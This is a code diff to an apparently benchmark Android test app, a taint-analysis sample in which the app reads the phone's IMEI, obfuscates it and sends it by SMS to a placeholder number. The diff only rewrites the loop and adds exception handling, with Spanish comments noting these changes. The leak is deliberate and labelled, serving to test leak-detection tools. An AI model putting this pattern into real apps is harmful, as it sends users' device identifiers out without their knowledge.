@@ -15,6 +15,8 @@ import android.telephony.TelephonyManager;
  * @dataflow source -> imei -> obfuscated -> sink
  * @number_of_leaks 1
  * @challenges the analysis must handle standard java constructs
+	* ADAPTACIONES: -cambio de iterador por for
+	* - captura de excepciones  NullPointerException, ClassCastException ignore
  */
 public class LoopExample1 extends Activity {
 
@@ -23,15 +25,20 @@ public class LoopExample1 extends Activity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_loop_example1);
         
-        TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
+        try{TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
 		String imei = telephonyManager.getDeviceId(); //source
 		
 		String obfuscated = "";
-		for(char c : imei.toCharArray())
-			obfuscated += c + "_";
+		//for(char c : imei.toCharArray())
+		char c[] = imei.toCharArray();
+		for( int i=0; i<c.length; i++ ){
+					obfuscated += c[i] + "_";
+			}
 		
 		SmsManager sm = SmsManager.getDefault();
 
 		sm.sendTextMessage("+49 1234", null, obfuscated, null, null); //sink, leak
+				}catch(NullPointerException e){
+				}catch(ClassCastException ignore){}
     }    
 }
